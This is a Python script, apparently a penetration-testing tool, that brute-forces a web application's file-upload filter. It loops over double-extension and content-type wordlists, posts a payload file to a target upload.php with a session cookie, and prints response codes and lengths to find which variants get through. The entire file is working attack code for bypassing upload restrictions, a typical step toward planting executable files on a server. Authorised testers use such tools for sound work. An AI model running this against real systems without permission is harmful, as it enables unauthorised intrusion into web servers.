import requests
import argparse
import base64
import urllib.parse
import binascii

# example usage:
#python3 fileUploadBf.py -ext -c=d4t0jgvfjhdnn5aqt4tonnpq2j --url=http://10.0.2.2/upload.php



banner ="""
     _                       _     _           
  __| | __ _ _ __ ___   __ _(_) __| | ___  ___ 
 / _` |/ _` | '_ ` _ \ / _` | |/ _` |/ _ \/ __|
| (_| | (_| | | | | | | (_| | | (_| |  __/ (__ 
 \__,_|\__,_|_| |_| |_|\__,_|_|\__,_|\___|\___|
                                               



"""

print(banner)

print("Example usage: python3 fileUploadBf.py -ext -c=d4t0jgvfjhdnn5aqt4tonnpq2j --url=http://10.0.2.2/upload.php")


parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", help="increase output verbosity",action="store_true")
parser.add_argument("-mb", "--mbytes", help="use magic bytes payload (JPEG)", action="store_true")
parser.add_argument("-fct", "--fuzzCont", help="brute force the allowed content type of file upload", action="store_true")
parser.add_argument("-ext", "--fileextension", help="brute force the allowed extension type of file upload", action="store_true")
#parser.add_argument("-c", "--cookies", help="cookies for authentication",nargs='?', const=1, type=str, required=True)
parser.add_argument("-c", "--cookies", help="cookies for authentication",nargs='?', const=1, type=str)
parser.add_argument("-u", "--url", help="specify the url and where is the file upload",nargs='?', const=1, type=str)
parser.add_argument("-d", "--data", help="other post data requirements" ,nargs='+', type=str)


args = parser.parse_args()










######################################################## content type
with open('files/contType.txt','r') as handle:
    data = handle.readlines()
ContentTypes = []
for contlist in data:
    ContentTypes.append(contlist.replace("\n",""))
######################################################## content type



######################################################## extension list
with open('files/double_extension_list.txt') as handle:
    data1 = handle.readlines()
fileExtensions = []
for ext in data1:
    fileExtensions.append(ext.replace("\n",""))





####################################################### cookies
cookies = {'PHPSESSID': args.cookies }

####################################################### proxy for burp
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


####################################################### post data values
values = {'fn': 'first name', 'ln': 'last name', 'bio': 'short bio', 'contact': '123123', 'email':'123@123.com', 'company':'companyname', 'update':''}


url = args.url



if args.fileextension:
    print("Bypassing extensions")
    ####### content type fuzzing
    x = 0

    for xtensions in fileExtensions:
        ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
        files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}

        

        #values = {args.data}
       
        #response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
        response = requests.post(url, files=files, data=values, cookies=cookies)

        print(f"using: {xtensions}")
        print(f"response code: {response}")

        print(f"content length: {len(response.content)} ")
        print("----------------------------------------------")

        x += 1


if args.fuzzCont:
    print("Brute forcing Content Type")
    ####### content type fuzzing
    x = 0

    for contypes in ContentTypes:
        files = {'file': ('test.jpeg', open('files/payloads/index.jpeg','rb'), contypes)}

        #values = {args.data}
        #response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
        response = requests.post(url, files=files, data=values, cookies=cookies)

        print(f"using: {contypes}")
        print(f"response code: {response}")

        print(f"content length: {len(response.content)} ")
        print("----------------------------------------------")

        x += 1

 